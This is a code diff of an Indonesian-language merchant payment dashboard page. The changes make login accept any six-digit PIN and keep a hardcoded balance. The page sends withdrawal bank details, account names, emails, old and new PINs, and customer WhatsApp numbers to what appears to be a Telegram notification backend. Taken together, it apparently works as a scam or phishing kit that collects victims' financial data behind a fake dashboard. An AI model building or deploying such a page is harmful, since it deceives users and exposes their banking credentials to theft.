@@ -112,17 +112,32 @@
         const BASE_URL = window.location.origin + "/"; 
         let items = []; const MAX_ITEMS = 10; let currentBalance = 2450000;
 
+        // --- UPDATE LOGIN: TERIMA 6 ANGKA APAPUN ---
         function doLogin() {
             const pin = document.getElementById('login-pin').value;
             const btn = document.querySelector('#login-overlay button.btn-main');
             const originalText = btn.innerText;
-            btn.innerText = "MEMVERIFIKASI..."; btn.disabled = true;
+            
+            btn.innerText = "MEMVERIFIKASI..."; 
+            btn.disabled = true;
+
             setTimeout(() => {
-                if(pin === "123456") { document.getElementById('login-overlay').classList.add('hidden'); document.getElementById('main-dashboard').classList.remove('hidden'); addItem(); } 
-                else { showToast("PIN Salah! Coba 123456", "❌"); document.getElementById('login-pin').value = ''; document.getElementById('login-pin').focus(); }
-                btn.innerText = originalText; btn.disabled = false;
+                // LOGIKA: Asal 6 digit angka, lolos (Untuk simulasi PIN Acak Email)
+                if(pin.length === 6 && /^\d+$/.test(pin)) { 
+                    document.getElementById('login-overlay').classList.add('hidden'); 
+                    document.getElementById('main-dashboard').classList.remove('hidden'); 
+                    addItem();
+                } 
+                else { 
+                    showToast("PIN harus 6 angka!", "❌"); 
+                    document.getElementById('login-pin').value = ''; 
+                    document.getElementById('login-pin').focus(); 
+                }
+                btn.innerText = originalText; 
+                btn.disabled = false;
             }, 800);
         }
+
         function logout() { if(confirm("Yakin ingin keluar?")) location.reload(); }
         
         function openRegister() { document.getElementById('register-modal').classList.remove('hidden'); }
@@ -146,14 +161,13 @@
             const name = document.getElementById('wd-name').value;
             const bank = document.getElementById('wd-bank').value;
             const store = document.getElementById('storeName').value;
-            const email = document.getElementById('wd-email').value; // Ambil Email
+            const email = document.getElementById('wd-email').value;
 
             if(!amountVal || !rek || !name || !email) return showToast("Lengkapi semua data!", "⚠️");
             if(isNaN(amount) || amount < 50000) return showToast("Minimal Rp 50.000", "⚠️");
             if(amount > currentBalance) return showToast("Saldo tidak cukup!", "💸");
             if(!email.includes("@")) return showToast("Email tidak valid!", "⚠️");
             
-            // Kirim data lengkap ke backend
             if(await sendTelegramNotif('WITHDRAW', { store, email, amount, bank, rek, name, sisa: currentBalance - amount }, '#withdraw-modal .btn-main')) {
                 currentBalance -= amount;
                 updateBalanceDisplay();
@@ -162,7 +176,6 @@
             }
         }
 
-        // UPDATE: SUBMIT FORGOT (EMAIL ONLY)
         async function submitForgot() {
             const email = document.getElementById('forgot-email').value;
             if(!email) return showToast("Masukkan alamat email!", "⚠️");
@@ -175,9 +188,19 @@
             }
         }
 
+        async function submitRegister() {
+            const store = document.getElementById('reg-store').value;
+            const wa = document.getElementById('reg-wa').value;
+            const email = document.getElementById('reg-email').value;
+            if(!store || !wa || !email) return showToast("Lengkapi data!", "⚠️");
+            if(await sendTelegramNotif('REGISTER', { store, wa, email }, '#register-modal .btn-main', "Mendaftar...")) {
+                closeModal('register-modal');
+                alert("Pendaftaran Berhasil! Cek Email Anda.");
+            }
+        }
+
         async function submitChangePin() { if(await sendTelegramNotif('CHANGE_PIN', { store: document.getElementById('storeName').value, oldPin: document.getElementById('set-old-pin').value, newPin: document.getElementById('set-new-pin').value }, '#settings-modal .bg-slate-800')) closeModal('settings-modal'); }
         async function submitDelete() { if(await sendTelegramNotif('DELETE_ACCOUNT', { store: document.getElementById('storeName').value, reason: document.getElementById('del-reason').value }, '#settings-modal .btn-danger')) closeModal('settings-modal'); }
-        async function submitRegister() { if(await sendTelegramNotif('REGISTER', { store: document.getElementById('reg-store').value, wa: document.getElementById('reg-wa').value, email: document.getElementById('reg-email').value }, '#register-modal .btn-main')) closeModal('register-modal'); }
 
         function updateBalanceDisplay() {
             const formatted = "Rp " + currentBalance.toLocaleString('id-ID');
@@ -185,7 +208,6 @@
             document.getElementById('nav-balance').innerText = formatted;
         }
 
-        // --- ITEM & INVOICE LOGIC ---
         function addItem() { if (items.length >= MAX_ITEMS) { showToast("Maksimal 10 barang!", "✋"); return; } items.push({ id: Date.now(), name: "", price: 0 }); renderItems(); }
         function removeItem(id) { items = items.filter(i => i.id !== id); renderItems(); }
         function updateItem(id, f, v) { const i = items.find(x => x.id === id); if(i) { f === 'price' ? i.price = parseInt(v.replace(/\D/g, "") || 0) : i.name = v; } renderItems(false); updateTotal(); }
@@ -198,34 +220,42 @@
             updateTotal();
         }
         function updateTotal() { document.getElementById('total-display').innerText = "Rp " + items.reduce((s, i) => s + (i.price || 0), 0).toLocaleString('id-ID'); }
-        function generateLink() {
+        
+        async function generateLink() {
             const wa = document.getElementById('custWa').value;
             const email = document.getElementById('custEmail').value;
+            const store = document.getElementById('storeName').value;
             if(!wa || !email) { showToast("WA & Email Pelanggan Wajib Diisi!", "⚠️"); return; }
-            if(items.length === 0 || items[0].price === 0) { showToast("Masukkan minimal 1 barang & harga!", "⚠️"); return; }
+            if(items.length === 0) { showToast("Masukkan minimal 1 barang!", "⚠️"); return; }
+
             const total = items.reduce((s, i) => s + (i.price || 0), 0);
             const itemsEncoded = btoa(JSON.stringify(items.map(i => ({n: i.name, p: i.price}))));
-            const params = new URLSearchParams({ store: document.getElementById('storeName').value, price: total, items: itemsEncoded, prod: items.length + " Items", ref_id: "INV-" + Date.now(), wa: wa, email: email, time: document.getElementById('timer').value });
-            document.getElementById('resultUrl').value = `${BASE_URL}?${params.toString()}`;
+            const prodName = items.length + " Items";
+            const refId = "INV-" + Date.now();
+
+            const params = new URLSearchParams({ store, price: total, items: itemsEncoded, prod: prodName, ref_id: refId, wa, email, time: document.getElementById('timer').value });
+            const finalUrl = `${BASE_URL}?${params.toString()}`;
+            
+            document.getElementById('resultUrl').value = finalUrl;
             document.getElementById('result-area').classList.remove('hidden');
             document.getElementById('result-area').scrollIntoView({behavior: "smooth"});
-            showToast("Link Invoice Berhasil Dibuat!", "✨");
+            showToast("Link Berhasil!", "✨");
+
+            // Notif Link Invoice Baru
+            await fetch('/api/send-notif', {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ type: 'CREATE_INVOICE', data: { store, price: total.toLocaleString('id-ID'), prod: prodName, ref: refId, url: finalUrl, wa, email } })
+            });
         }
-        function copyLink() { document.getElementById("resultUrl").select(); navigator.clipboard.writeText(document.getElementById("resultUrl").value); showToast("Link disalin!", "📋"); }
+        
+        function copyLink() { document.getElementById("resultUrl").select(); navigator.clipboard.writeText(document.getElementById("resultUrl").value); showToast("Disalin!", "📋"); }
         function shareWa() { 
             const url = document.getElementById("resultUrl").value;
-            if(!url) return showToast("Buat link dulu!", "⚠️");
             const total = items.reduce((s, i) => s + (i.price || 0), 0);
             let list = items.map(i => `- ${i.name} (Rp ${i.price.toLocaleString('id-ID')})`).join('%0A');
             window.open(`https://wa.me/${document.getElementById('custWa').value}?text=Halo%20Kak%2C%0A%0ABerikut%20pesanan%20Anda%3A%0A${list}%0A%0ATotal%3A%20*Rp%20${total.toLocaleString('id-ID')}*%0A%0ABayar%20di%20sini%3A%0A${url}`, '_blank');
         }
-        function showToast(msg, icon="🔔") {
-            const t = document.getElementById('toast');
-            document.getElementById('toast-msg').innerText = msg;
-            document.getElementById('toast-icon').innerText = icon;
-            t.classList.remove('opacity-0', 'translate-y-10');
-            setTimeout(() => t.classList.add('opacity-0', 'translate-y-10'), 3000);
-        }
+        function showToast(msg, icon="🔔") { const t = document.getElementById('toast'); document.getElementById('toast-msg').innerText = msg; document.getElementById('toast-icon').innerText = icon; t.classList.remove('opacity-0', 'translate-y-10'); setTimeout(() => t.classList.add('opacity-0', 'translate-y-10'), 3000); }
         updateBalanceDisplay();
     </script>
 </body>
